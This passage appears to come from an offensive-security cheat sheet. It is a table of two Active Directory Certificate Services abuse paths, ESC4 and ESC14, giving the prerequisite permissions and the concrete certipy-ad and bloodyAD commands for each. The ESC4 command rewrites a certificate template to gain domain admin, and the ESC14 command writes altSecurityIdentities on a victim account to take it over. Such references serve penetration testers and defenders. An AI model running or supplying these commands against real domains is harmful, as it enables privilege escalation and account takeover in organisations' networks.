...
| ESC4 | `WriteDacl`/`GenericAll`/`WriteOwner`/`GenericWrite` → `CertTemplate` (or `ADCSESC4`) | Write rights over a template object | `certipy-ad template -template '<TPL>' -save-configuration tpl.json`  → restore via `-write-configuration` → flips ESC1 prereqs ON, then run ESC1 | Make template ESC1-vulnerable → DA |
...
| ESC14 | `WriteSPN`/`GenericWrite`/`WriteDacl` over user with `altSecurityIdentities` writable, OR ability to set `msDS-OIDToGroupLink` | Write `altSecurityIdentities` on victim to attacker's cert subject (explicit cert mapping) | `bloodyAD --host <DC> -d <DOM> -u <U> -p <P> set object '<VICTIM>' altSecurityIdentities -v 'X509:<I>...<S>...'` (certipy has no such command) → request cert → auth as victim | Account takeover via explicit cert mapping |
